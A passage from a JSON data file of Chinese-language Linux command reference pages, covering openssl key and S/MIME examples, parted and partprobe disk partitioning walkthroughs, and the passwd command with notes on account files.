1024</span>\n</code></pre>\n<p>从dhparam.pem中读取Diffie-Hell参数，以C代码的形式，输出到stdout。</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-meta\"># openssl dhparam -in dhparam.pem -noout -C</span>\n</code></pre>\n<p> <strong>5、DSA应用例子应用例子</strong></p>\n<p>生成1024位DSA参数集，并输出到文件dsaparam.pem。</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-meta\"># openssl dsaparam -out dsaparam.pem 1024</span>\n</code></pre>\n<p>使用参数文件dsaparam.pem生成DSA私钥匙，采用3DES加密后输出到文件dsaprivatekey.pem</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-meta\"># openssl gendsa -out dsaprivatekey.pem -des3 dsaparam.pem</span>\n</code></pre>\n<p>使用私钥匙dsaprivatekey.pem生成公钥匙，输出到dsapublickey.pem</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-meta\"># openssl dsa -in dsaprivatekey.pem -pubout -out dsapublickey.pem</span>\n</code></pre>\n<p>从dsaprivatekey.pem中读取私钥匙，解密并输入新口令进行加密，然后写回文件dsaprivatekey.pem</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-meta\"># openssl dsa -in dsaprivatekey.pem -out dsaprivatekey.pem -des3 -passin</span>\n</code></pre>\n<p> <strong>6、RSA应用例子</strong></p>\n<p>产生1024位RSA私匙，用3DES加密它，口令为trousers，输出到文件rsaprivatekey.pem</p>\n<pre><code class=\"language-shell\"># openssl genrsa -<span class=\"hljs-keyword\">out</span> rsaprivatekey.pem -passout <span class=\"hljs-keyword\">pass</span>:trousers -des3 <span class=\"hljs-number\">1024</span>\n</code></pre>\n<p>从文件rsaprivatekey.pem读取私匙，用口令trousers解密，生成的公钥匙输出到文件rsapublickey.pem</p>\n<pre><code class=\"language-shell\"># openssl rsa -<span class=\"hljs-keyword\">in</span> rsaprivatekey.pem -passin <span class=\"hljs-keyword\">pass</span>:trousers -pubout -<span class=\"hljs-keyword\">out</span> rsapubckey.pem\n</code></pre>\n<p>用公钥匙rsapublickey.pem加密文件plain.txt，输出到文件cipher.txt</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-meta\"># openssl rsautl -encrypt -pubin -inkey rsapublickey.pem -in plain.txt -out cipher.txt</span>\n</code></pre>\n<p>使用私钥匙rsaprivatekey.pem解密密文cipher.txt，输出到文件plain.txt</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-meta\"># openssl rsautl -decrypt -inkey rsaprivatekey.pem -in cipher.txt -out plain.txt</span>\n</code></pre>\n<p>用私钥匙rsaprivatekey.pem给文件plain.txt签名，输出到文件signature.bin</p>\n<pre><code class=\"language-shell\"># openssl rsautl -<span class=\"hljs-built_in\">sign</span> -inkey rsaprivatekey.pem -<span class=\"hljs-keyword\">in</span> plain.txt -<span class=\"hljs-keyword\">out</span> signature.bin\n</code></pre>\n<p>用公钥匙rsapublickey.pem验证签名signature.bin，输出到文件plain.txt</p>\n<pre><code class=\"language-shell\"># openssl rsautl -<span class=\"hljs-built_in\">verify</span> -pubin -inkey rsapublickey.pem -<span class=\"hljs-keyword\">in</span> signature.bin -<span class=\"hljs-keyword\">out</span> plain\n</code></pre>\n<p>从X.509证书文件cert.pem中获取公钥匙，用3DES加密mail.txt，输出到文件mail.enc</p>\n<pre><code class=\"language-shell\"># openssl smime -encrypt -<span class=\"hljs-keyword\">in</span> mail.txt -des3 -<span class=\"hljs-keyword\">out</span> mail.<span class=\"hljs-keyword\">enc</span> cert.pem\n</code></pre>\n<p>从X.509证书文件cert.pem中获取接收人的公钥匙，用私钥匙key.pem解密S/MIME消息mail.enc，结果输出到文件mail.txt</p>\n<pre><code class=\"language-shell\"># openssl smime -decrypt -<span class=\"hljs-keyword\">in</span> mail.enc -recip cert.pem -inkey <span class=\"hljs-keyword\">key</span>.pem -<span class=\"hljs-keyword\">out</span> mail.txt\n</code></pre>\n<p>cert.pem为X.509证书文件，用私匙key,pem为mail.txt签名，证书被包含在S/MIME消息中，输出到文件mail.sgn</p>\n<pre><code class=\"language-shell\"># openssl smime -<span class=\"hljs-built_in\">sign</span> -<span class=\"hljs-keyword\">in</span> mail.txt -signer cert.pem -inkey key.pem -<span class=\"hljs-keyword\">out</span> mail.sgn\n</code></pre>\n<p>验证S/MIME消息mail.sgn，输出到文件mail.txt，签名者的证书应该作为S/MIME消息的一部分包含在mail.sgn中</p>\n<pre><code class=\"language-shell\"># openssl smime -<span class=\"hljs-built_in\">verify</span> -<span class=\"hljs-keyword\">in</span> mail.sgn -<span class=\"hljs-keyword\">out</span> mail.txt\n</code></pre>\n<p>更多实例:</p>\n<pre><code class=\"language-shell\">openssl <span class=\"hljs-built_in\">version</span> -<span class=\"hljs-keyword\">a</span>\nopenssl help\nopenssl genrsa -aes128 -out fd.key <span class=\"hljs-number\">2048</span> <span class=\"hljs-comment\"># pem format</span>\nopenssl rsa -<span class=\"hljs-keyword\">text</span> -<span class=\"hljs-keyword\">in</span> fd.key\n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->\n"
    },
    {
        "title": "parted",
        "des": "磁盘分区和分区大小调整工具",
        "body": "<h1 id=\"parted\">parted</h1>\n<p>磁盘分区和分区大小调整工具</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>parted命令</strong> 是由GNU组织开发的一款功能强大的磁盘分区和分区大小调整工具，与fdisk不同，它支持调整分区的大小。作为一种设计用于Linux的工具，它没有构建成处理与fdisk关联的多种分区类型，但是，它可以处理最常见的分区格式，包括：ext2、ext3、fat16、fat32、NTFS、ReiserFS、JFS、XFS、UFS、HFS以及Linux交换分区。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shellshell\"><span class=\"hljs-function\"><span class=\"hljs-title\">parted</span><span class=\"hljs-params\">(选项)</span><span class=\"hljs-params\">(参数)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shellshell\"><span class=\"hljs-deletion\">-h：显示帮助信息；</span>\n<span class=\"hljs-deletion\">-i：交互式模式；</span>\n<span class=\"hljs-deletion\">-s：脚本模式，不提示用户；</span>\n<span class=\"hljs-deletion\">-v：显示版本号。</span>\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<ul>\n<li>  设备：指定要分区的硬盘所对应的设备文件；</li>\n<li>  命令：要执行的parted命令。</li>\n</ul>\n<h3 id=\"实例\">实例</h3>\n<p>从串行技术出现以来，越来越多用户选择使用大容量的SATA硬盘创建磁盘阵列；特别是MD1000/MD3000，很轻易就突破2T的LUN，故在此给大家一些指引。</p>\n<p>红帽企业 Linux 4 Update 4供对大于 2 terabytes（TB）的磁盘设备的支持。</p>\n<p>请参考以下操作步骤：</p>\n<p>注：</p>\n<ul>\n<li>  绿色代表你需要使用的命令。</li>\n<li>  红色代表你需要注意到的输出信息，在后续需要使用。</li>\n</ul>\n<pre><code class=\"language-shell\">[root@localhost ~]<span class=\"hljs-comment\"># fdisk -l</span>\nDisk /dev/sda: 35.8 GB,<span class=\"hljs-number\"> 35862976512 </span>bytes\n255 heads,<span class=\"hljs-number\"> 63 </span>sectors/track,<span class=\"hljs-number\"> 4360 </span>cylinders\nUnits = cylinders of<span class=\"hljs-number\"> 16065 </span>*<span class=\"hljs-number\"> 512 </span>=<span class=\"hljs-number\"> 8225280 </span>bytes\n   Device Boot      Start         End      Blocks   id  System\n/dev/sda1   *          <span class=\"hljs-number\"> 1 </span>        <span class=\"hljs-number\"> 13 </span>    <span class=\"hljs-number\"> 104391 </span> <span class=\"hljs-number\"> 83 </span> Linux\n/dev/sda2             <span class=\"hljs-number\"> 14 </span>       <span class=\"hljs-number\"> 144 </span>    1052257+ <span class=\"hljs-number\"> 82 </span> Linux swap\n/dev/sda3            <span class=\"hljs-number\"> 145 </span>      <span class=\"hljs-number\"> 4360 </span>  <span class=\"hljs-number\"> 33865020 </span> <span class=\"hljs-number\"> 83 </span> Linux\nDisk /dev/sdb:<span class=\"hljs-number\"> 2147 </span>MB,<span class=\"hljs-number\"> 2147483648 </span>bytes\n255 heads,<span class=\"hljs-number\"> 63 </span>sectors/track,<span class=\"hljs-number\"> 261 </span>cylinders\nUnits = cylinders of<span class=\"hljs-number\"> 16065 </span>*<span class=\"hljs-number\"> 512 </span>=<span class=\"hljs-number\"> 8225280 </span>bytes\nDisk /dev/sdb doesn't contain a valid partition table\n</code></pre>\n<pre><code class=\"language-shell\">[root@localhost ~]# parted <span class=\"hljs-regexp\">/dev/</span>sdb\nGNU Parted Copyright (C) <span class=\"hljs-number\">1998</span> - <span class=\"hljs-number\">2004</span> free Software Foundation, Inc.\n<span class=\"hljs-keyword\">This</span> program is free software, covered by the GNU General <span class=\"hljs-keyword\">Public</span> License.\n<span class=\"hljs-keyword\">This</span> program is distributed in the hope that it will be useful, but WITHOUT <span class=\"hljs-keyword\">ANY</span>\nWARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS <span class=\"hljs-keyword\">FOR</span> A\nPARTICULAR PURPOSE.  See the GNU General <span class=\"hljs-keyword\">Public</span> License <span class=\"hljs-keyword\">for</span> more details.\n使用<span class=\"hljs-regexp\">/dev/</span>sdb\n(parted)mklabel gpt\n(parted)<span class=\"hljs-keyword\">print</span>\n<span class=\"hljs-regexp\">/dev/</span>sdb的磁盘几何结构：<span class=\"hljs-number\">0.000</span>-<span class=\"hljs-number\">2048.000</span>兆字节\n磁盘标签类型：gpt\nMinor   起始点       终止点 文件系统   名称                 标志\n(parted)mkpart primary <span class=\"hljs-number\">0</span> <span class=\"hljs-number\">2048</span>  &lt;-----上面<span class=\"hljs-keyword\">print</span>显示的数字\n(parted)<span class=\"hljs-keyword\">print</span>\n<span class=\"hljs-regexp\">/dev/</span>sdb的磁盘几何结构：<span class=\"hljs-number\">0.000</span>-<span class=\"hljs-number\">2048.000</span>兆字节\n磁盘标签类型：gpt\nMinor   起始点       终止点 文件系统   名称                 标志\n<span class=\"hljs-number\">1</span>          <span class=\"hljs-number\">0.017</span>   <span class=\"hljs-number\">2047.983</span>\n(parted)quit\n</code></pre>\n<p>如果必要，不要忘记更新<code>/etc/fstab</code>。</p>\n<pre><code class=\"language-shell\">[root@localhost ~]<span class=\"hljs-comment\"># fdisk -l</span>\nDisk /dev/sda: 35.8 GB,<span class=\"hljs-number\"> 35862976512 </span>bytes\n255 heads,<span class=\"hljs-number\"> 63 </span>sectors/track,<span class=\"hljs-number\"> 4360 </span>cylinders\nUnits = cylinders of<span class=\"hljs-number\"> 16065 </span>*<span class=\"hljs-number\"> 512 </span>=<span class=\"hljs-number\"> 8225280 </span>bytes\n   Device Boot      Start         End      Blocks   Id  System\n/dev/sda1   *          <span class=\"hljs-number\"> 1 </span>        <span class=\"hljs-number\"> 13 </span>    <span class=\"hljs-number\"> 104391 </span> <span class=\"hljs-number\"> 83 </span> Linux\n/dev/sda2             <span class=\"hljs-number\"> 14 </span>       <span class=\"hljs-number\"> 144 </span>    1052257+ <span class=\"hljs-number\"> 82 </span> Linux swap\n/dev/sda3            <span class=\"hljs-number\"> 145 </span>      <span class=\"hljs-number\"> 4360 </span>  <span class=\"hljs-number\"> 33865020 </span> <span class=\"hljs-number\"> 83 </span> Linux\nWARNING: GPT (GUID Partition Table) detected on '/dev/sdb'! The util fdisk doesn't support GPT. Use GNU Parted.\n\nDisk /dev/sdb:<span class=\"hljs-number\"> 2147 </span>MB,<span class=\"hljs-number\"> 2147483648 </span>bytes\n255 heads,<span class=\"hljs-number\"> 63 </span>sectors/track,<span class=\"hljs-number\"> 261 </span>cylinders\nUnits = cylinders of<span class=\"hljs-number\"> 16065 </span>*<span class=\"hljs-number\"> 512 </span>=<span class=\"hljs-number\"> 8225280 </span>bytes\n   Device Boot      Start         End      Blocks   Id  System\n/dev/sdb1              <span class=\"hljs-number\"> 1 </span>       <span class=\"hljs-number\"> 262 </span>    2097151+  ee  EFI GPT\nPartition<span class=\"hljs-number\"> 1 </span>has different physical/logical beginnings (non-Linux?):\n     phys=(0, 0, 1) logical=(0,0, 2)\nPartition<span class=\"hljs-number\"> 1 </span>has different physical/logical endings:\n     phys=(1023, 254, 63) logical=(261, 21, 16)\n</code></pre>\n<pre><code class=\"language-shell\">[root@localhost ~]# mkfs.ext3 /dev/sdb1\nmke2fs 1.35 (28-Feb-2004)\nFilesystem label=\nOS type: Linux\nBlock <span class=\"hljs-attribute\">size</span>=4096 (<span class=\"hljs-attribute\">log</span>=2)\nFragment <span class=\"hljs-attribute\">size</span>=4096 (<span class=\"hljs-attribute\">log</span>=2)\n262144 inodes, 524279 blocks\n26213 blocks (5.00%) reserved <span class=\"hljs-keyword\">for</span> the super<span class=\"hljs-built_in\"> user\n</span>First data <span class=\"hljs-attribute\">block</span>=0\nMaximum filesystem <span class=\"hljs-attribute\">blocks</span>=536870912\n16 block groups\n32768 blocks per group, 32768 fragments per<span class=\"hljs-built_in\"> group\n</span>16384 inodes per<span class=\"hljs-built_in\"> group\n</span>Superblock backups stored on blocks:\n        32768, 98304, 163840, 229376, 294912\nWriting inode tables: done\nCreating journal (8192 blocks): done\nWriting superblocks <span class=\"hljs-keyword\">and</span> filesystem<span class=\"hljs-built_in\"> accounting </span>information: done\nThis filesystem will be automatically checked every 28 mounts <span class=\"hljs-keyword\">or</span>\n180 days, whichever comes first.  Use tune2fs -c <span class=\"hljs-keyword\">or</span> -i <span class=\"hljs-keyword\">to</span> override.\n</code></pre>\n<pre><code class=\"language-shell\">[root@localhost ~]<span class=\"hljs-comment\"># mount /dev/sdb1 /mnt</span>\n[root@localhost ~]<span class=\"hljs-comment\"># df -h</span>\nFilesystem            容量  已用 可用 已用% 挂载点\n<span class=\"hljs-regexp\">/dev/</span>sda3              &lt;?xml:namespace prefix = st1 <span class=\"hljs-regexp\">/&gt;32G  2.6G   28G   9% /</span>\n<span class=\"hljs-regexp\">/dev/</span>sda1              <span class=\"hljs-number\">99</span>M   <span class=\"hljs-number\">12</span>M   <span class=\"hljs-number\">82</span>M  <span class=\"hljs-number\">13</span>% /boot\nnone                  <span class=\"hljs-number\">252</span>M     <span class=\"hljs-number\">0</span>  <span class=\"hljs-number\">252</span>M   <span class=\"hljs-number\">0</span>% <span class=\"hljs-regexp\">/dev/</span>shm\n<span class=\"hljs-regexp\">/dev/</span>sdb1             <span class=\"hljs-number\">2.0</span>G   <span class=\"hljs-number\">36</span>M  <span class=\"hljs-number\">1.9</span>G   <span class=\"hljs-number\">2</span>% /mnt\n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "partprobe",
        "des": "不重启的情况下重读分区",
        "body": "<h1 id=\"partprobe\">partprobe</h1>\n<p>不重启的情况下重读分区</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>partprobe命令</strong> 用于重读分区表，当出现删除文件后，出现仍然占用空间。可以partprobe在不重启的情况下重读分区。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">partprobe</span><span class=\"hljs-params\">(选项)</span><span class=\"hljs-params\">(参数)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-d：不更新内核；</span>\n<span class=\"hljs-deletion\">-s：显示摘要和分区；</span>\n<span class=\"hljs-deletion\">-h：显示帮助信息；</span>\n<span class=\"hljs-deletion\">-v：显示版本信息。</span>\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<p>设备：指定需要确认分区表改变的硬盘对应的设备文件。</p>\n<h3 id=\"实例\">实例</h3>\n<p>使用partprobe不重启系统添加新的磁盘分区，主机自带硬盘超过300GB，目前只划分使用了3个主分区，不到70GB，如下：</p>\n<pre><code class=\"language-shell\">[root@localhost ~]<span class=\"hljs-comment\"># df -h </span>\nFilesystem Size Used Avail Use% Mounted on \n<span class=\"hljs-regexp\">/dev/</span>sda1 <span class=\"hljs-number\">29</span>G <span class=\"hljs-number\">3.7</span>G  <span class=\"hljs-number\">24</span>G <span class=\"hljs-number\">14</span>% / \n<span class=\"hljs-regexp\">/dev/</span>sda2 <span class=\"hljs-number\">29</span>G  <span class=\"hljs-number\">22</span>G <span class=\"hljs-number\">5.2</span>G <span class=\"hljs-number\">81</span>% /oracle \ntmpfs    <span class=\"hljs-number\">2.0</span>G    <span class=\"hljs-number\">0</span> <span class=\"hljs-number\">2.0</span>G  <span class=\"hljs-number\">0</span>% <span class=\"hljs-regexp\">/dev/</span>shm\n</code></pre>\n<pre><code class=\"language-shell\">[root@localhost ~]<span class=\"hljs-comment\"># cat /proc/partitions</span>\nmajor minor  <span class=\"hljs-comment\">#blocks  name</span>\n\n  <span class=\"hljs-number\"> 8 </span>   <span class=\"hljs-number\"> 0 </span><span class=\"hljs-number\"> 311427072 </span>sda\n  <span class=\"hljs-number\"> 8 </span>   <span class=\"hljs-number\"> 1 </span> <span class=\"hljs-number\"> 30716248 </span>sda1\n  <span class=\"hljs-number\"> 8 </span>   <span class=\"hljs-number\"> 2 </span> <span class=\"hljs-number\"> 30716280 </span>sda2\n  <span class=\"hljs-number\"> 8 </span>   <span class=\"hljs-number\"> 3 </span>  <span class=\"hljs-number\"> 8193150 </span>sda3\n  <span class=\"hljs-number\"> 8 </span>  <span class=\"hljs-number\"> 16 </span>   <span class=\"hljs-number\"> 976896 </span>sdb\n  <span class=\"hljs-number\"> 8 </span>  <span class=\"hljs-number\"> 32 </span>   <span class=\"hljs-number\"> 976896 </span>sdc\n\n…省略其他\n</code></pre>\n<p>现在需要给系统添加1个100GB的空间存放数据文件，而又不影响现有系统上业务的运行，使用fdisk结合partprobe命令不重启系统添加一块新的磁盘分区。操作步骤如下：</p>\n<p> <strong>第1步 添加新的磁盘分区</strong> ：</p>\n<pre><code class=\"language-shell\">[root<span class=\"hljs-variable\">@localhost</span> <span class=\"hljs-operator\">~</span>]# fdisk <span class=\"hljs-operator\">/</span>dev<span class=\"hljs-operator\">/</span>sda\nThe number <span class=\"hljs-keyword\">of</span> cylinders <span class=\"hljs-keyword\">for</span> this disk <span class=\"hljs-keyword\">is</span> <span class=\"hljs-keyword\">set</span> <span class=\"hljs-keyword\">to</span> <span class=\"hljs-number\">38770.</span>\nThere <span class=\"hljs-keyword\">is</span> nothing wrong <span class=\"hljs-keyword\">with</span> that, but this <span class=\"hljs-keyword\">is</span> larger than <span class=\"hljs-number\">1024</span>,\n<span class=\"hljs-keyword\">and</span> could <span class=\"hljs-keyword\">in</span> certain setups cause problems <span class=\"hljs-keyword\">with</span>:\n<span class=\"hljs-number\">1</span>) software that runs <span class=\"hljs-keyword\">at</span> boot <span class=\"hljs-type\">time</span> (e.g., <span class=\"hljs-keyword\">old</span> versions <span class=\"hljs-keyword\">of</span> lilo)\n<span class=\"hljs-number\">2</span>) booting <span class=\"hljs-keyword\">and</span> partitioning software <span class=\"hljs-keyword\">from</span> other OSs\n   (e.g., DOS FDISK, OS<span class=\"hljs-operator\">/</span><span class=\"hljs-number\">2</span> FDISK)\n\ncommand (m <span class=\"hljs-keyword\">for</span> help): p\n\nDisk <span class=\"hljs-operator\">/</span>dev<span class=\"hljs-operator\">/</span>sda: <span class=\"hljs-number\">318.9</span> GB, <span class=\"hljs-number\">318901321728</span> bytes\n<span class=\"hljs-number\">255</span> heads, <span class=\"hljs-number\">63</span> sectors<span class=\"hljs-operator\">/</span>track, <span class=\"hljs-number\">38770</span> cylinders\nUnits <span class=\"hljs-operator\">=</span> cylinders <span class=\"hljs-keyword\">of</span> <span class=\"hljs-number\">16065</span> <span class=\"hljs-operator\">*</span> <span class=\"hljs-number\">512</span> <span class=\"hljs-operator\">=</span> <span class=\"hljs-number\">8225280</span> bytes\n\n   Device Boot      <span class=\"hljs-keyword\">Start</span>         <span class=\"hljs-keyword\">End</span>      Blocks   id  <span class=\"hljs-keyword\">System</span>\n<span class=\"hljs-operator\">/</span>dev<span class=\"hljs-operator\">/</span>sda1   <span class=\"hljs-operator\">*</span>           <span class=\"hljs-number\">1</span>        <span class=\"hljs-number\">3824</span>    <span class=\"hljs-number\">30716248</span><span class=\"hljs-operator\">+</span>  <span class=\"hljs-number\">83</span>  Linux\n<span class=\"hljs-operator\">/</span>dev<span class=\"hljs-operator\">/</span>sda2            <span class=\"hljs-number\">3825</span>        <span class=\"hljs-number\">7648</span>    <span class=\"hljs-number\">30716280</span>   <span class=\"hljs-number\">83</span>  Linux\n<span class=\"hljs-operator\">/</span>dev<span class=\"hljs-operator\">/</span>sda3            <span class=\"hljs-number\">7649</span>        <span class=\"hljs-number\">8668</span>     <span class=\"hljs-number\">8193150</span>   <span class=\"hljs-number\">82</span>  Linux swap <span class=\"hljs-operator\">/</span> Solaris\n\nCommand (m <span class=\"hljs-keyword\">for</span> help): n\nCommand action\n   e   extended\n   p   <span class=\"hljs-keyword\">primary</span> <span class=\"hljs-keyword\">partition</span> (<span class=\"hljs-number\">1</span><span class=\"hljs-number\">-4</span>)\np\nSelected <span class=\"hljs-keyword\">partition</span> <span class=\"hljs-number\">4</span>\n<span class=\"hljs-keyword\">First</span> cylinder (<span class=\"hljs-number\">8669</span><span class=\"hljs-number\">-38770</span>, <span class=\"hljs-keyword\">default</span> <span class=\"hljs-number\">8669</span>):\n<span class=\"hljs-keyword\">Using</span> <span class=\"hljs-keyword\">default</span> <span class=\"hljs-keyword\">value</span> <span class=\"hljs-number\">8669</span>\n<span class=\"hljs-keyword\">last</span> cylinder <span class=\"hljs-keyword\">or</span> <span class=\"hljs-operator\">+</span>size <span class=\"hljs-keyword\">or</span> <span class=\"hljs-operator\">+</span>sizeM <span class=\"hljs-keyword\">or</span> <span class=\"hljs-operator\">+</span>sizeK (<span class=\"hljs-number\">8669</span><span class=\"hljs-number\">-38770</span>, <span class=\"hljs-keyword\">default</span> <span class=\"hljs-number\">38770</span>): <span class=\"hljs-operator\">+</span><span class=\"hljs-number\">100</span>G   \nCommand (m <span class=\"hljs-keyword\">for</span> help): w\nThe <span class=\"hljs-keyword\">partition</span> <span class=\"hljs-keyword\">table</span> has been altered<span class=\"hljs-operator\">!</span>\n\nCalling ioctl() <span class=\"hljs-keyword\">to</span> re<span class=\"hljs-operator\">-</span>read <span class=\"hljs-keyword\">partition</span> table.\n\nWARNING: Re<span class=\"hljs-operator\">-</span>reading the <span class=\"hljs-keyword\">partition</span> <span class=\"hljs-keyword\">table</span> failed <span class=\"hljs-keyword\">with</span> error <span class=\"hljs-number\">16</span>: \n\nDevice <span class=\"hljs-keyword\">or</span> resource busy.\nThe kernel still uses the <span class=\"hljs-keyword\">old</span> table.\nThe <span class=\"hljs-keyword\">new</span> <span class=\"hljs-keyword\">table</span> will be used <span class=\"hljs-keyword\">at</span> the next reboot.\nSyncing disks.\n</code></pre>\n<p> <strong>第2步 使用工具partprobe让kernel读取分区信息：</strong> </p>\n<pre><code class=\"language-shell\">[root<span class=\"hljs-symbol\">@localhost</span> ~]<span class=\"hljs-meta\"># partprobe</span>\n</code></pre>\n<p>使用fdisk工具只是将分区信息写到磁盘，如果需要mkfs磁盘分区则需要重启系统，而使用partprobe则可以使kernel重新读取分区信息，从而避免重启系统。</p>\n<p> <strong>第3步 格式化文件系统：</strong> </p>\n<pre><code class=\"language-shell\">[root@localhost ~]# mkfs.ext3 /dev/sda4\nmke2fs 1.39 (29-May-2006)\nFilesystem label=\nOS type: Linux\nBlock <span class=\"hljs-attribute\">size</span>=4096 (<span class=\"hljs-attribute\">log</span>=2)\nFragment <span class=\"hljs-attribute\">size</span>=4096 (<span class=\"hljs-attribute\">log</span>=2)\n12222464 inodes, 24416791 blocks\n1220839 blocks (5.00%) reserved <span class=\"hljs-keyword\">for</span> the super<span class=\"hljs-built_in\"> user\n</span>First data <span class=\"hljs-attribute\">block</span>=0\nMaximum filesystem <span class=\"hljs-attribute\">blocks</span>=4294967296\n746 block groups\n32768 blocks per group, 32768 fragments per<span class=\"hljs-built_in\"> group\n</span>16384 inodes per<span class=\"hljs-built_in\"> group\n</span>Superblock backups stored on blocks:\n        32768, 98304, 163840, 229376, 294912, 819200, 884736, 1605632, \n　　　　2654208, 4096000, 7962624, 11239424, 20480000, 23887872\n\nWriting inode tables: done\nCreating journal (32768 blocks): done\nWriting superblocks <span class=\"hljs-keyword\">and</span> filesystem<span class=\"hljs-built_in\"> accounting </span>information:\n\ndone\n\nThis filesystem will be automatically checked every 26 mounts <span class=\"hljs-keyword\">or</span>\n180 days, whichever comes first.  Use tune2fs -c <span class=\"hljs-keyword\">or</span> -i <span class=\"hljs-keyword\">to</span> override.\n[root@localhost ~]#\n</code></pre>\n<p> <strong>第4步 mount新的分区<code>/dev/sda4</code>：</strong> </p>\n<pre><code class=\"language-shell\">[root@localhost ~]<span class=\"hljs-comment\"># e2label  /dev/sda4 /data</span>\n[root@localhost ~]<span class=\"hljs-comment\"># mkdir /data</span>\n[root@localhost ~]<span class=\"hljs-comment\"># mount /dev/sda4 /data</span>\n[root@localhost ~]<span class=\"hljs-comment\"># df</span>\nFilesystem           1K-blocks      Used Available Use% Mounted on\n/dev/sda1            <span class=\"hljs-number\"> 29753556 </span> <span class=\"hljs-number\"> 3810844 </span><span class=\"hljs-number\"> 24406900 </span> 14% /\n/dev/sda2            <span class=\"hljs-number\"> 29753588 </span><span class=\"hljs-number\"> 11304616 </span><span class=\"hljs-number\"> 16913160 </span> 41% /oracle\ntmpfs                 <span class=\"hljs-number\"> 2023936 </span>       <span class=\"hljs-number\"> 0 </span> <span class=\"hljs-number\"> 2023936 </span>  0% /dev/shm\n/dev/sda4            <span class=\"hljs-number\"> 96132968 </span>  <span class=\"hljs-number\"> 192312 </span><span class=\"hljs-number\"> 91057300 </span>  1% /data\n</code></pre>\n<p>使用partprobe可以不用重启系统即可配合fdisk工具创建新的分区。</p>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "passwd",
        "des": "用于让用户可以更改自己的密码",
        "body": "<h1 id=\"passwd\">passwd</h1>\n<p>用于让用户可以更改自己的密码</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>passwd命令</strong> 用于设置用户的认证信息，包括用户密码、密码过期时间等。系统管理者则能用它管理系统用户的密码。只有管理者可以指定用户名称，一般用户只能变更自己的密码。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">passwd</span><span class=\"hljs-params\">(选项)</span><span class=\"hljs-params\">(参数)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-d：删除密码，仅有系统管理者才能使用；</span>\n<span class=\"hljs-deletion\">-f：强制执行；</span>\n<span class=\"hljs-deletion\">-k：设置只有在密码过期失效后，方能更新；</span>\n<span class=\"hljs-deletion\">-l：锁住密码；</span>\n<span class=\"hljs-deletion\">-s：列出密码的相关信息，仅有系统管理者才能使用；</span>\n<span class=\"hljs-deletion\">-u：解开已上锁的帐号。</span>\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<p>用户名：需要设置密码的用户名。</p>\n<h3 id=\"知识扩展\">知识扩展</h3>\n<p>与用户、组账户信息相关的文件</p>\n<p>存放用户信息：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-regexp\">/etc/</span>passwd\n<span class=\"hljs-regexp\">/etc/</span>shadow\n</code></pre>\n<p>存放组信息：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-regexp\">/etc/g</span>roup\n<span class=\"hljs-regexp\">/etc/g</span>shadow\n</code></pre>\n<p>用户信息文件分析（每项用<code>:</code>隔开）</p>\n<pre><code class=\"language-shell\">例如：<span class=\"hljs-symbol\">jack:</span><span class=\"hljs-symbol\">X:</span><span class=\"hljs-number\">503</span><span class=\"hljs-symbol\">:</span><span class=\"hljs-number\">504</span>::<span class=\"hljs-symbol\">:/home/jack/</span><span class=\"hljs-symbol\">:/bin/bash</span>\njack　　<span class=\"hljs-comment\"># 用户名</span>\nX　　<span class=\"hljs-comment\"># 口令、密码</span>\n<span class=\"hljs-number\">503</span>　　<span class=\"hljs-comment\"># 用户id（0代表root、普通新建用户从500开始）</span>\n<span class=\"hljs-number\">504</span>　　<span class=\"hljs-comment\"># 所在组</span>\n:　　<span class=\"hljs-comment\"># 描述</span>\n/home/jack/　　<span class=\"hljs-comment\"># 用户主目录</span>\n/bin/bash　　<span class=\"hljs-comment\"># 用户缺省Shell</span>\n</code></pre>\n<p>组信息文件分析</p>\n<pre><code class=\"language-shell\">例如：<span class=\"hljs-symbol\">jack:</span><span class=\"hljs-variable\">$!</span><span class=\"hljs-variable\">$:</span><span class=\"hljs-string\">??</span><span class=\"hljs-string\">?:</span><span class=\"hljs-number\">13801</span><span class=\"hljs-symbol\">:</span><span class=\"hljs-number\">0</span><span class=\"hljs-symbol\">:</span><span class=\"hljs-number\">99999</span><span class=\"hljs-symbol\">:</span><span class=\"hljs-number\">7</span><span class=\"hljs-symbol\">:*</span><span class=\"hljs-symbol\">:*</span>:\njack　　<span class=\"hljs-comment\"># 组名</span>\n<span class=\"hljs-variable\">$!</span><span class=\"hljs-variable\">$　</span>　<span class=\"hljs-comment\"># 被加密的口令</span>\n<span class=\"hljs-number\">13801</span>　　<span class=\"hljs-comment\"># 创建日期与今天相隔的天数</span>\n<span class=\"hljs-number\">0</span>　　<span class=\"hljs-comment\"># 口令最短位数</span>\n<span class=\"hljs-number\">99999</span>　　<span class=\"hljs-comment\"># 用户口令</span>\n<span class=\"hljs-number\">7</span>　　<span class=\"hljs-comment\"># 到7天时提醒</span>\n*　　<span class=\"hljs-comment\"># 禁用天数</span>\n*　　<span class=\"hljs-comment\"># 